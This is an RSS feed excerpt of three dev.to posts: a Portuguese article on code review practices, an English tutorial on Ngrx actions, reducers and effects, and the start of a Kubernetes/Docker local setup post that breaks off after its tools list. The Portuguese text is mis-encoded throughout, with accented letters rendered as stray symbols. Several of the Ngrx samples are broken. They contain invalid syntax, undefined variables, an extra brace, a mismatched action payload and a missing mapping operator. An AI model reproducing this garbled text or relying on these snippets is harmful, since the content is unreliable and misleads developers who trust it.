      <title>Engenharia de Software: O tal Code Review</title>
      <author>Marylly</author>
      <pubDate>Tue, 14 Sep 2021 23:16:17 +0000</pubDate>
      <link>https://dev.to/marylly/engenharia-de-software-o-tal-code-review-5eof</link>
      <guid>https://dev.to/marylly/engenharia-de-software-o-tal-code-review-5eof</guid>
      <description>&lt;h2&gt;
  &lt;a href="#o-que-%C3%A9"&gt;
  &lt;/a&gt;
  O que √©?
&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Code Review&lt;/em&gt; ou Revis√£o de c√≥digo √© uma pr√°tica onde o c√≥digo desenvolvido para atender determinada demanda passa pela revis√£o de outras pessoas desenvolvedoras antes de ser integrada a uma vers√£o principal de um software.&lt;/p&gt;

&lt;p&gt;Idealmente n√£o deve ser um processo mandat√≥rio, e sim um pacto do time, e o valor deve ser muito bem entendido para que existam benef√≠cios.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#code-review-x-pr%C3%A1ticas-ag%C3%A9is"&gt;
  &lt;/a&gt;
  &lt;em&gt;Code Review&lt;/em&gt; x Pr√°ticas Ag√©is
&lt;/h2&gt;

&lt;p&gt;Do ponto de vista do desenvolvimento √°gil de software, o &lt;em&gt;code review&lt;/em&gt; √© um processo que impacta a velocidade do time e da entrega, e pode virar um gargalo se algumas boas pr√°ticas n√£o s√£o atendidas, logo uma m√° pr√°tica.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#contexto-e-cen%C3%A1rios-comuns"&gt;
  &lt;/a&gt;
  Contexto e Cen√°rios + comuns
&lt;/h2&gt;

&lt;p&gt;Considerando muitos times de desenvolvimento de software, muitos n√£o det√©m do todo o conhecimento elementar que permitam um modelo de trabalho mais √°gil utilizando &lt;em&gt;trunk based&lt;/em&gt; sem um processo de &lt;em&gt;code review&lt;/em&gt; estruturado e maduro. O &lt;em&gt;trunk based&lt;/em&gt; deve ser o pr√≥ximo passo ap√≥s superadas essas defici√™ncias e o processo de &lt;em&gt;code review&lt;/em&gt; eliminado.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#como-aplicar"&gt;
  &lt;/a&gt;
  Como aplicar?
&lt;/h2&gt;

&lt;p&gt;Apesar de alguns contrapontos, o processo de &lt;em&gt;code review&lt;/em&gt; pode ser bem ben√©fico, e pode apoiar a maturidade e evolu√ß√£o t√©cnica do time em muito aspectos.&lt;/p&gt;

&lt;p&gt;Nessa pr√°tica, temos dois pap√©is: &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Pessoa(s) quem desenvolveu o c√≥digo&lt;/li&gt;
&lt;li&gt;Pessoa(s) quem pode trazer pontos de melhoria, identificar contrapontos e sugerir formas distintas para resolver n√£o somente o problema de implementa√ß√£o, como problemas relacionados a demanda do c√≥digo.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Pode ser feito de duas maneiras: (1) Pessoalmente com as pessoas que a autora do c√≥digo confia e se sente segura, ou sua lideran√ßa imediata. (2) Utilizando o recurso de &lt;em&gt;Pull Request&lt;/em&gt; oferecida por ferramentas de host de versionamento (GitHub, GitLab, BitBucket, etc)&lt;/p&gt;

&lt;p&gt;A expectativa do processo √© responder algumas das perguntas relacionadas abaixo:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1. C√≥digo limpo ou &lt;a href="https://dev.to/marylly/clean-code-introducao-bfb"&gt;&lt;em&gt;Clean Code&lt;/em&gt;&lt;/a&gt;:&lt;/strong&gt; √â poss√≠vel as pessoas lerem o c√≥digo e entender o seu prop√≥sito (comportamento/resultado)? &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. Diretrizes do Projeto:&lt;/strong&gt; Perfom√°tico, escal√°vel, enxuto, padr√µes de projetos, padr√µes de arquitetura, &lt;em&gt;style guide&lt;/em&gt;, etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. Funcionalidade:&lt;/strong&gt; O comportamento do c√≥digo atende as expectativas da pessoa desenvolvedora e as pessoas que ir√£o usar: clientes, etc? Efeitos colaterais no comportamento e/ou funcionalidades j√° existentes no software?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4. Complexidade:&lt;/strong&gt; As mesmas tarefas e resultados do c√≥digo podem ser executadas com um c√≥digo mais simples e enxuto?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5. Testes:&lt;/strong&gt; O c√≥digo est√° sendo testado? Existem cen√°rios que cubram os cen√°rios feliz e infeliz do processo principal desenvolvido no c√≥digo? Se um comportamento indesejado ou inesperado surgir, os testes sinalizaram?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6. Nomes:&lt;/strong&gt; Os nomes utilizados no c√≥digo trazem uma conex√£o com os processos e problemas de neg√≥cio que o c√≥digo est√° sendo desenvolvido para resolver? Os nomes empregados nas vari√°veis, classes, m√©todos, fun√ß√µes apoiam o entendimento do comportamento ou da sa√≠da de c√≥digo em revis√£o?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7. Coment√°rios:&lt;/strong&gt; Os que foram utilizados est√£o f√°cil de compreender, curtos e realmente √∫teis onde aplicados?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8. Efeitos colaterais:&lt;/strong&gt; Impacta na comunica√ß√£o e/ou comportamento de aplica√ß√µes internas/externas e de parceiros? Quebra de contratos de comunica√ß√£o?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;9. Documenta√ß√£o:&lt;/strong&gt; A documenta√ß√£o de apoio precisa ser atualizada? Cont√©m o que precisa para executar alguma atividade ou tarefa relacionada ao c√≥digo?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#benef%C3%ADcios"&gt;
  &lt;/a&gt;
  Benef√≠cios
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Apoia o engajamento do time com a sa√∫de do c√≥digo;&lt;/li&gt;
&lt;li&gt;Apoia no aprendizado de linguagens, frameworks, paradigmas, etc;&lt;/li&gt;
&lt;li&gt;Acelera o engajamento de novas pessoas desenvolvedoras sobre o que √© esperado do c√≥digo;&lt;/li&gt;
&lt;li&gt;A medida que as boas pr√°ticas e melhorias s√£o aplicadas, novas formas s√£o discutidas e absorvidas, aumentando a qualidad;&lt;/li&gt;
&lt;li&gt;Fortalece a confian√ßa da pessoa desenvolvedora e do time em &lt;em&gt;deploys&lt;/em&gt; de alta qualidade;&lt;/li&gt;
&lt;li&gt;Promove discuss√µes sobre: (1) Tecnologias usadas e novas (2) Discuss√µes sobre arquitetura de c√≥digo (3) Discuss√µes sobre boas pr√°ticas;&lt;/li&gt;
&lt;li&gt;Promove o compartilhamento de conhecimento e a coopera√ß√£o;&lt;/li&gt;
&lt;li&gt;Apoia na identifica√ß√£o de refatora√ß√µes e d√©bitos t√©cnicos que podem ser trabalhados posteriormente.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#contrapontos"&gt;
  &lt;/a&gt;
  Contrapontos
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Pode gerar estresse e ansiedade para as pessoas autoras do c√≥digo, principalmente para pessoas novas no time/projeto.&lt;/li&gt;
&lt;li&gt;Pode se tornar um gargalo no ciclo de desenvolvimento de software.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#recomenda%C3%A7%C3%B5es"&gt;
  &lt;/a&gt;
  RECOMENDA√á√ïES
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#autora-do-c%C3%B3digo"&gt;
  &lt;/a&gt;
  Autora do C√≥digo
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Na apresenta√ß√£o ou descri√ß√£o da revis√£o, comunique o objetivo da implementa√ß√£o, e se for necess√°rio, as id√©ias por traz da solu√ß√£o desenvolvida;&lt;/li&gt;
&lt;li&gt;Se o processo for por PRs, fa√ßa-os de forma incremental com pouco conte√∫do e sinalize o trabalho ainda em andamento (vulgo WIP ou &lt;em&gt;Work in Progress&lt;/em&gt;), para n√£o desestimular as pessoas revisoras pelo volume ou pela falta de tempo para revisar adequadamente;&lt;/li&gt;
&lt;li&gt;Evite enviar para revis√£o peda√ßos de c√≥digo n√£o-funcionais ou que n√£o agregam ao processo. Atrapalha a revis√£o e aumenta o tempo utilizado para entender o que o c√≥digo faz;&lt;/li&gt;
&lt;li&gt;Evite c√≥digos de coisas que ainda v√£o ser desenvolvidas no futuro (as vezes coisas n√£o confirmadas). Ex. Classes vazias, m√©todos/fun√ß√µe vazios, as vezes s√≥ a sua assinatura, TO-DOS, etc;&lt;/li&gt;
&lt;li&gt;N√£o espere pelo tempo das pessoas revisoras, sinalize as envolvidas, afinal todas temos prazos para serem atendidos, e a entrega √© do time, pelo algu√©m do time deve se organizar para fazer a revis√£o;&lt;/li&gt;
&lt;li&gt;Se for fazer revis√£o pessoalmente, agende com a pessoa e reserve um tempo para focar adequadamente no processo;&lt;/li&gt;
&lt;li&gt;Se n√£o houver consenso ou ocorrer conflitos, busque a lideran√ßa ou outras pessoas para chegar na melhor solu√ß√£o poss√≠vel para o contexto e momento;&lt;/li&gt;
&lt;li&gt;Em revis√µes privadas, compartilhe os resultados num coment√°rio do PR ou num canal comum com o time para que todas entendam e aprendam com a informa√ß√£o;&lt;/li&gt;
&lt;li&gt;Evite c√≥digo/artefatos desnecess√°rios: C√≥digo comentado que n√£o est√° e/ou nem ser√° utilizado, arquivos que n√£o precisam ser versionados ou que s√£o tempor√°rios.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#revisora-do-c%C3%B3digo"&gt;
  &lt;/a&gt;
  Revisora do c√≥digo
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Evite criticar a pessoa ou c√≥digo;&lt;/li&gt;
&lt;li&gt;Seja propositiva nos coment√°rios, e compartilhe suas raz√µes;&lt;/li&gt;
&lt;li&gt;Foque nas diretrizes do projeto;&lt;/li&gt;
&lt;li&gt;Evite compartilhar opini√µes pessoais, fa√ßa de forma privada, somente voc√™ e a pessoa autora;&lt;/li&gt;
&lt;li&gt;N√£o compartilhe &lt;em&gt;feedbacks&lt;/em&gt; negativos ou construtivos, fa√ßa de forma privada, somente voc√™ e a pessoa autora;&lt;/li&gt;
&lt;li&gt;Se existir d√∫vida se vai ofender ou gerar conflitos, fa√ßa de forma privada ou busque apoio para transmitir a mensagem adequadamente;&lt;/li&gt;
&lt;li&gt;Nem sempre as prefer√™ncias da pessoa revisora √© uma regra que deve ser adotada pela pessoa autora do c√≥digo, e isso deve ficar bem entendido pelas pessoas envolvidas;&lt;/li&gt;
&lt;li&gt;Sinalize quando um coment√°rio √© apenas uma sugest√£o, n√£o necessariamente algo mandat√≥rio, e a pessoa autora pode tomar a decis√£o de fazer ou n√£o;&lt;/li&gt;
&lt;li&gt;Busque o consenso em detrimento da imposi√ß√£o;&lt;/li&gt;
&lt;li&gt;Abordagens interessantes de solu√ß√£o foram apresentadas, reconhe√ßa, aprecie a pessoa autora do c√≥digo, reforce as coisas boas e que trazem valor;&lt;/li&gt;
&lt;li&gt;Se n√£o conhece muito bem a &lt;em&gt;codebase&lt;/em&gt;, comece pelos testes para entender o comportamento desenvolvido e os elementos do c√≥digo utilizado para confrontar com a proposta inicial da demanda.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#princ%C3%ADpios-recomendados"&gt;
  &lt;/a&gt;
  Princ√≠pios Recomendados
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;1. Novas demandas emergentes:&lt;/strong&gt; Podem surgir necessidades de reavalia√ß√£o da implementa√ß√£o, refatora√ß√£o e at√© necessidade de criar novas funcionalidades. As pessoas da lideran√ßa e de neg√≥cio devem ser sinalizadas e a solu√ß√£o replanejada ou refatorada de acordo com o prazo, pessoas e recursos dispon√≠veis, evitar absorver esse trabalho emergente num trabalho iniciado e identificado atrav√©s de uma revis√£o de c√≥digo;&lt;br&gt;
&lt;strong&gt;2. Ambiente seguro e inclusivo:&lt;/strong&gt; N√ÉO √© um espa√ßo para repress√£o das pessoas autoras por preconceitos por parte das pessoas revisoras, pelas caracter√≠sticas da pessoa autora do c√≥digo (ra√ßa, g√™nero, origem, religi√£o, inclina√ß√£o pol√≠tica, comportamento e/ou apar√™ncia), todas as pessoas DEVEM ser respeitadas pelo o que REALMENTE s√£o;&lt;br&gt;
&lt;strong&gt;3. Espa√ßo de aprendizado:&lt;/strong&gt; N√ÉO √© um espa√ßo para as pessoas autoras serem reprimidas por falta de alguns conhecimentos, e sim, para suprir defici√™ncias t√©cnicas, aprender novas formas de trabalho, exporem suas id√©ias, fortalecerem seus conhecimentos e obter &lt;em&gt;feedback&lt;/em&gt; sobre a evolu√ß√£o do trabalho antes de ir para ambiente produtivo;&lt;br&gt;
&lt;strong&gt;4. Revis√µes r√°pidas:&lt;/strong&gt; O time deve ser encorajado a fazer as revis√µes assim que poss√≠vel, o per√≠odo m√°ximo de um dia de trabalho para ser conclu√≠do.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclus%C3%B5es"&gt;
  &lt;/a&gt;
  Conclus√µes
&lt;/h2&gt;

&lt;p&gt;Apesar do &lt;em&gt;Code Review&lt;/em&gt; n√£o ser considerada uma boa pr√°tica, pode ser um espa√ßo de muito crescimento e amadurecimento das pessoas envolvidas, e deve ser utilizado como um trampolim para a evolu√ß√£o para o formato &lt;em&gt;trunk based&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Se conhece outras formas para a pr√°tica do processo, compartilhe comigo nos coment√°rios, seria muito legal continuar a conversa e evoluir sobre o tema. =]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;ATEN√á√ÉO: Esse conte√∫do √© a consolida√ß√£o das impress√µes e opini√µes da autora sobre o assunto, resultado de viv√™ncias e processos emp√≠ricos que trouxeram resultados para contextos espec√≠ficos, n√£o h√° garantia que √© aderente a qualquer contexto e/ou time de desenvolvimento de software.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#refer%C3%AAncias"&gt;
  &lt;/a&gt;
  Refer√™ncias
&lt;/h2&gt;

&lt;p&gt;Google Inc: &lt;strong&gt;The Standard of Code Review, Engineering Practices.&lt;/strong&gt; Acessado em 10 de Setembro de 2021: &lt;a href="https://google.github.io/eng-practices/review/reviewer/standard.html"&gt;https://google.github.io/eng-practices/review/reviewer/standard.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Yu, Chak Shun; Better Programming Blog: &lt;strong&gt;5 Actionable tips to deliver higher quality code reviews today.&lt;/strong&gt;&lt;br&gt;
Acessado em 14 de Setembro de 2021: &lt;a href="https://betterprogramming.pub/5-actionable-tips-to-deliver-higher-quality-code-reviews-today-de422cd538df"&gt;https://betterprogramming.pub/5-actionable-tips-to-deliver-higher-quality-code-reviews-today-de422cd538df&lt;/a&gt;&lt;/p&gt;

</description>
      <category>codereview</category>
      <category>agile</category>
      <category>bestpractice</category>
      <category>engineering</category>
    </item>
    <item>
      <title>Understanding Ngrx Actions, Reducers and Effects</title>
      <author>Muhammad Muhktar Musa</author>
      <pubDate>Tue, 14 Sep 2021 23:01:24 +0000</pubDate>
      <link>https://dev.to/mcube25/understanding-ngrx-actions-reducers-and-effects-j9e</link>
      <guid>https://dev.to/mcube25/understanding-ngrx-actions-reducers-and-effects-j9e</guid>
      <description>&lt;h4&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h4&gt;

&lt;p&gt;Actions, Reducers and Effects are building blocks in Ngrx which is used in many Angular applications. This article is meant to explain the relationship between the three and how we can use them in an application&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#actions"&gt;
  &lt;/a&gt;
  Actions
&lt;/h4&gt;

&lt;p&gt;Actions are one of the main building blocks in Ngrx. Actions express unique events that happen throughout an application. This events can be user interaction with a page, external interaction through network request and direct interaction with the device API's. Actions are the input and output of many systems in Ngrx. They help in understanding how events are handled in an application. The Action is an object like interface. Let us have a look of what an Action interface looks like.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;interface Action {
  type: string
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The Action interface has a single property. Its type is represented as a string. The type property is for describing the action that will be dispatched into an application. The value of the type comes from the &lt;strong&gt;&lt;em&gt;[source]&lt;/em&gt;&lt;/strong&gt;  event and is used to provide a context of what category of action is to be taken. Properties are added to an action to provide additional context or metadata for an action. Actions are JavaScript objects in simple terms. For example an event is triggered from an authentication after interacting with a backend API can be described as&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  type: '[Auth API] Login success';
  username: string;
  password: string;
  phone - number: number;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above action is an event triggered by a user clicking a login button from the login page to attempt to authenticate a user. The username, password and phone-number are defined as additional metadata from the login page.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#writing-actions"&gt;
  &lt;/a&gt;
  Writing Actions
&lt;/h4&gt;

&lt;p&gt;The following rules should be applied when a good action is to be written within an application&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Write actions before developing features. This is to understand and gain a shared knowledge of the feature being implemented&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Provide contents that are descriptive and that are targeted to a unique event with more detailed information that can be used to debug in the developer tools.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Divide actions into categories based on the event source.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Actions are inexpensive to write. For this reason, the more actions written the better a developer can express a work flow.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Actions should be event driven. Events should be captured and not commands as the description of an event are the handling of the event.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let us take a look at an example Action. First we import Actions from the Ngrx store into our action file&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import { Action } from '@ngrx/store';
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next we import our data source&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import { Assessmentconfig } from 'src/app/shared/models/school.model';

export enum AssessmentconfigActionTypes {
  CreateAssessmentconfig = '[Assessmentconfig] Create'
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next we implement our action&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export class CreateAssessmentconfig implements Action {
 type = AssessmentconfigActionTypes.CreateAssessmentconfig;
  constructor(public payload: { assessmentconfig: Assessmentconfig }) {}
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The CreateAssessmentconfig function returns an object in the shape of an action interface. The constructor will be used to define any additional metadata needed for the handling of the action. The action being dispatched should be created in a consistent, type-safe way. The action creator can the be used to return the action when dispatching.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;onSubmit(username: string, password: string){
  store.dispatch(CreateAssessmentconfig({
    username: username,
    password: password
  }
  ))
};

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The CreateAssessmentconfig action creator receives an object of username and password and returns a plane javaScript object with a property type of &lt;strong&gt;&lt;em&gt;[Login Page], Login&lt;/em&gt;&lt;/strong&gt;. The returned action has very specific context about where the action came from and what happened.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The category of the action is captured within the square brackets []&lt;/li&gt;
&lt;li&gt;The category is used to group actions for a particular area. This area can be a component page, backend API or browser API&lt;/li&gt;
&lt;li&gt;The Login text after the category is a description of what event occurred from the action.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#reducers"&gt;
  &lt;/a&gt;
  Reducers
&lt;/h4&gt;

&lt;p&gt;Reducers are functions responsible for handling transitions from one state to the next state in an application. They are pure functions in that they produce the same output for a given input without any side effects handling state transition synchronously. Each reducer function takes the latest Action dispatched, the current state and determines whether to return a newly modified state or the original state.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#the-reducer-function"&gt;
  &lt;/a&gt;
  The Reducer Function
&lt;/h4&gt;

&lt;p&gt;The consistent parts of pieces of state managed by a reducer are&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;An interface or type that defines the shape of the state &lt;/li&gt;
&lt;li&gt;The functions that handle the state changes for the associated actions&lt;/li&gt;
&lt;li&gt;The arguments including the initial state or current state and current action.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let us take a look at an example&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export interface AssessmentconfigState {
  // additional entities state properties
  selectedId: number;
  loading: boolean;
  error: string;
  query: AssessmentconfigSearchQuery;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A reducer file is created and the a default state is set as in above. A reducer function is a listener of actions.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export class CreateAssessmentconfig implements Action {
 type = AssessmentconfigActionTypes.CreateAssessmentconfig;
  constructor(public payload: { assessmentconfig: Assessmentconfig }) {}
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above code in the Actions folder describes the transitions that will be handled by the reducer. We will import this action into the reducer file. The shape of the state will now be defined according to what is to be captured.&lt;/p&gt;

&lt;p&gt;We can now use the default state to create an initial state for a required state property.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export const initialAssessmentconfigState: AssessmentconfigState({

  selectedId: null,
  loading: false,
  error: '',
  query: {
    filter: '',
    sorting: '',
    limit: 999,
    page: 1
  }
});
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To create a reducer function we can&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;export function assessmentconfigReducer(state = initialAssessmentconfigState,
  action: AssessmentconfigActions): AssessmentconfigState {
  switch (action.type) {
    case AssessmentconfigActionTypes.CreateAssessmentconfig:
      return {
        ...state,
        loading: true,
        error: ''
      };

    default:
      return state;
  }
}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the reducer above, the action is strongly typed. The action handles the state transition immutably. The state transition are not modifying the original state but returning a new state of objects using the spread operator. The spread syntax copies the properties for the current state into the object creating a new reference.&lt;br&gt;
 This ensures that a new state is produced with the change. This preserves the purity of the change thereby promoting referential integrity that guarantees old references are discarded when a state change occurs.  When an action is dispatched, all registered reducers receive the action. Reducers are only responsible for deciding which state transition should occur for a given action.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#effects"&gt;
  &lt;/a&gt;
  Effects
&lt;/h4&gt;

&lt;p&gt;In an Angular application there is need to handle impure actions. Impure actions can be network request, websocket messages and time based events. In a service based Angular application, components are responsible for interacting with external resources through services. Effects provide a way to interact with those services so as to isolate them from the component. They handle task such as fetching data, running task that produce multiple events and other external interactions where components do not need explicit knowledge of such interactions. In other words effects&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;isolate side effects from components allowing for more pure components that select state and dispatch actions.&lt;/li&gt;
&lt;li&gt;are long running services that listen to observable of every action dispatched on the store&lt;/li&gt;
&lt;li&gt;filter the actions based on the type of action they are interested in. This is done by an operator&lt;/li&gt;
&lt;li&gt;performs tasks which are synchronous or asynchronous, returning a new action.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In service based applications, components interact with data through many different services that expose the data through properties and methods. This services may depend on other services. Components consume these services to perform task giving them many responsibilities. &lt;br&gt;
 Effects when used along with the &lt;strong&gt;&lt;em&gt;store&lt;/em&gt;&lt;/strong&gt; decreases the responsibility of the component. In a larger application, it becomes more important because of multiple sources of data.  Effects handle external data and interactions allowing services to be less stateful and only perform tasks related to the external interactions.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#writing-effects"&gt;
  &lt;/a&gt;
  Writing Effects
&lt;/h4&gt;

&lt;p&gt;To isolate side effects from a component, an effect class should be created to listen for events and perform task. Effects are injectable service classes with distinct parts which are&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;An injectable actions service that provides an observable stream of all actions dispatched after the latest state has been reduced.&lt;/li&gt;
&lt;li&gt;Metadata is attached to the observable stream using the create function. The metadata is used to register the streams the store subscribes to and returns actions from the effects stream dispatching back to the store.&lt;/li&gt;
&lt;li&gt;Actions are filtered using pipeable &lt;code&gt;ofType&lt;/code&gt; operator. This operator takes one or more action types as arguments and filters the action to be acted upon.&lt;/li&gt;
&lt;li&gt;Effects are subscribed to the store observable.&lt;/li&gt;
&lt;li&gt;Services are injected into effects to interact with external API's and handle stream.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let us take an example at play&lt;br&gt;
First we import&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import { Injectable } from '@angular/core';
import { Actions, Effect, ofType } from '@ngrx/effects';
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The action and services are now imported from the&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;import {AssessmentconfigActionTypes,CreateAssessmentconfig,
 CreateAssessmentconfigFail 
} from './assessmentconfig.actions';
import { SchoolService } from 'src/app/shared/services/school.service';
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We create the effects by&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;@Injectable()
export class AssessmentconfigEffects {
  // ========================================= CREATE
  @Effect()
  create: Observable&amp;lt;Action&amp;gt; = this.actions$.pipe(
    ofType&amp;lt;CreateAssessmentconfig&amp;gt;(AssessmentconfigActionTypes.CreateAssessmentconfig),
      this.service.createAssessmentConfig(schoolId, action.payload.assessmentconfig).pipe(
        switchMap((assessmentconfig: Assessmentconfig) =&amp;gt; {
          const a1 = new CreateAssessmentconfigSuccess({ result: assessmentconfig });
          const a2 = new SelectAssessmentconfigById({ id: assessmentconfig.id });
          return [a1, a2];
        }),
        catchError(({ message }) =&amp;gt; of(new CreateAssessmentconfigFail({ error: message })))
      )
    )
  );

  constructor(private actions$: Actions, private store: Store&amp;lt;ApplicationState&amp;gt;,
     private service: SchoolService) {}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The AssessmentconfigEffects is listening for all dispatched actions through the Action stream. It shows its specific interest by using the  &lt;code&gt;ofType&lt;/code&gt; operator. The stream of action is then mapped into a new observable using the &lt;code&gt;switchMap&lt;/code&gt;  operator. It returns a new action with an error method attached. The action is dispatched to the store where it would be handled by the reducers when a state change is needed. It is very important to handle errors when dealing with observable streams so that the effects can continue running.&lt;/p&gt;

&lt;p&gt;This brings us to the end of this article. We have explained how to create Ngrx Actions, Reducers and Effects as well as their implementation in an application.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>angular</category>
      <category>ngrx</category>
      <category>devops</category>
    </item>
    <item>
      <title>Building a Basic Local Kubernetes/Docker Setup</title>
      <author>ndesmic</author>
      <pubDate>Tue, 14 Sep 2021 22:49:10 +0000</pubDate>
      <link>https://dev.to/ndesmic/building-a-basic-local-kubernetes-docker-setup-1fdk</link>
      <guid>https://dev.to/ndesmic/building-a-basic-local-kubernetes-docker-setup-1fdk</guid>
      <description>&lt;p&gt;I found myself needing to trying to test out some Kubernetes stuff locally.  In order to do so I needed to build a cluster but I actually found the resources that came up a bit lacking.  I actually got stuck trying to figure out how to hit my cluster externally. So once I figure out what I needed to know I decided to try a few different approaches to making a basic setup for container orchestration setup.  Hopefully this is helpful to someone.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#the-tools"&gt;
  &lt;/a&gt;
  The Tools
&lt;/h1&gt;

&lt;p&gt;The tools we need are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;kubectl to interact with the cluster - &lt;a href="https://www.downloadkubernetes.com/"&gt;https://www.downloadkubernetes.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;kind to build the cluster - &lt;a href="https://github.com/kubernetes-sigs/kind"&gt;https://github.com/kubernetes-sigs/kind&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;minikube to build a minikube cluster - &lt;a href="https://minikube.sigs.k8s.io/docs/"&gt;https://minikube.sigs.k8s.io/docs/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;docker to build images - &lt;a href="https://www.docker.com/get-started"&gt;https://www.docker.com/get-started&lt;/a&gt; (or &lt;code&gt;winget install docker&lt;/code&gt; for winget users)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Note: You may need to reboot and check that hardware virtualization is enabled in your BIOS if you are fresh installing docker.&lt;/p&gt;

&lt;p&gt;I feel like a real devops already.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#a-simple-app"&gt;
  &lt;/a&gt;
  A simple app
&lt;/h1&gt;

